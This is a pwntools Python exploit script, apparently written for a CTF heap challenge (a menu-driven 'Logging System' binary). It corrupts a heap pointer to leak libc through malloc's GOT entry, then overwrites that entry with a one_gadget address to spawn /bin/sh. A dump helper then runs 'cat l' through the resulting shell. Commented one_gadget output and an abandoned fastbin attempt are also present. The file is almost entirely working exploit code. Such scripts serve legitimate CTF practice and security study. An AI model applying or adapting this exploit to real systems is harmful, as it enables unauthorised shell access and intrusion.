#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import os, sys

DEBUG = 1
context.arch = "amd64"
context.log_level = "debug"
elf = ELF("./l",checksec=False)

# synonyms for faster typing
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.ra = tube.recvall
tube.rr = tube.recvregex
tube.irt = tube.interactive

if DEBUG == 1:
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	s = process("./l")
elif DEBUG == 2:
	libc = ELF("./libc.so.6",checksec=False)
	s = process("./l", env={"LD_PRELOAD":"./libc.so.6"})
elif DEBUG == 3:
	libc = ELF("./libc.so.6",checksec=False)
	ip = "localhost" 
	port = 10001
	s = remote(ip,port)

def z(addr):
    raw_input("debug?")
    gdb.attach(s, "b *" + str(addr))

wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open("/proc/%s/mem" % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink("/proc/%s/exe" % pid)
   with open("/proc/%s/maps" % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split("-")[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def zx(addr = 0):
    global mypid
    mypid = proc.pidof(s)[0]
    raw_input("debug?")
    with open("/proc/%s/mem" % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        gdb.attach(s, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))

def menu(choice):
   s.sla(">", str(choice))

def add(size, msg):
   menu(1)
   s.sa("length:", str(size))
   s.sa("Content:", msg)

def delete(idx):
   menu(2)
   s.sa("number\xef\xbc\x9a", str(idx))

def show(idx):
   menu(3)
   s.sa("number\xef\xbc\x9a", str(idx))

def edit(idx, msg):
   menu(4)
   s.sa("to change:", str(idx))
   s.sa("your changes:", msg)

def pwn():
   s.sa("to login:", "AAAA")


   '''Stage1: Leak libc'''
   add(0x10, "AAAA")
   #add(0x60, "BBBB")

   delete(0)

   add(0x10, "IIII")

   edit(0, p64(elf.got["malloc"]))

   show(1)
   libc.address = u64(s.r(6) + "\0\0") - libc.sym["malloc"]
   info("libc.address: 0x%x", libc.address)
   one_shot = libc.address + 0x45216
   info("libc.address: 0x%x", one_shot)

   '''one_shot'''
   '''
   root@linuxkit-025000000001:/pwn/Logging System# one_gadget /lib/x86_64-linux-gnu/libc.so.6
   0x45216	execve("/bin/sh", rsp+0x30, environ)
   constraints:
   rax == NULL

   0x4526a	execve("/bin/sh", rsp+0x30, environ)
   constraints:
   [rsp+0x30] == NULL

   0xf02a4	execve("/bin/sh", rsp+0x50, environ)
   constraints:
   [rsp+0x50] == NULL

   0xf1147	execve("/bin/sh", rsp+0x70, environ)
   constraints:
   [rsp+0x70] == NULL
   '''

   edit(1, p64(one_shot))
   s.sa(">", "1")

   #z(0x400B3D)
   #add(0x8, "CCCC")

   '''
   # Wrong
   add(0x60, "AAAA")
   add(0x60, "BBBB")

   delete(0)
   delete(1)
   delete(0)

   edit(0, p64(0x6030ad))
   
   add(0x60, "DDDDDDDD")
   add(0x60, chr(0) * 3 + p64(4) + p64(0) * 3 + p64(elf.got["puts"]))

   #show(0)
   '''

   s.irt()

def dump():
	pwn()
	s.recv(timeout=1)
	s.sl("cat l")
	s.sl("exit")
	data = s.ra()
	f = open("dump", "wb")
	f.write(data)
	f.close()

if __name__ == "__main__":
    pwn()